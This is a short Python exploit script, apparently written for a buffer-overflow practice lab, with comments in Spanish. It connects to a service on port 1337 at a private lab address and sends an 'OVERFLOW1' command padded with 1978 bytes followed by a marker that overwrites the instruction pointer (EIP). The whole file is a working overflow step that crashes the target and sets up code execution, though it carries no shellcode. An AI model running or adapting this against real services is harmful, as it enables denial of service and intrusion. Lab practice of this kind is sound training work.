#!/usr/bin/python3

import socket

HOST = "10.10.68.180"
PORT = 1337

to_reach_EIP = 1978

try:
    print(f"(+) Sobreescribiendo EI Pe.")

    # Connection
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((HOST, PORT))
    server.settimeout(5)
    from_server = server.recv(1024)
    
    # Exploit
    payload = (
        b"OVERFLOW1 " +
        b"A" * to_reach_EIP +
        b"BCDE"
    )

    server.send(payload)

    from_server = server.recv(1024)
    server.close()

except socket.timeout:
    print(f"(+) El programa dejó de responder...")
